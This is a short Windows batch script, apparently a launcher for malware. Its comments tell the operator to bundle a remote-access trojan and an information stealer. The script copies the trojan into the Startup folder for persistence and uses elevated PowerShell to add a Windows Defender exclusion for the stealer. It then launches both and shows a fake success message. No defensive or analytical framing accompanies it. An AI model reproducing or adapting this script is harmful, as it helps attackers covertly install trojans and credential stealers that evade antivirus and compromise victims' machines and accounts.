:: CREATE AN SHORTCUT OF BOTH THE RAT AND THE STEALER AND MODIFY THE CODE BEFORE RUNNING. MAKE SURE TO ENABLE RUN AS ADMINISTRATOR ON THE SHORTCUT'S OPTIONS.
:: CREATE AN FOLDER AND DRAG AND DROP BOTH THE RAT AND THE STEALER THEN MODIFY THE CODE.
@echo off
echo Running shortcuts with administrator privileges...
:: MODIFY THIS VARIABLE WITH YOUR FOLDER NAME BEFORE RUNNING 
set "folderPath=%~dp0lol"
copy "%folderPath%\*RAT_NAME*" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
::ORIGINAL STEALER FILE VARIABLE.
set "PROGRAM_NAME=*STEALER_NAME*"
powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"\"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%PROGRAM_NAME%.exe\"\" -Force' -Verb RunAs"
start "" "%folderPath%\*STEALER_NAME* - Shortcut"
timeout /t 1 /nobreak >nul
echo LOADING...
start "" "%folderPath%\*RAT_NAME* - Shortcut"
timeout /t 1 /nobreak >nul
echo ...
timeout /t 1 /nobreak >nul
echo PROGRAM STARTED SUCCESFULLY.
pause
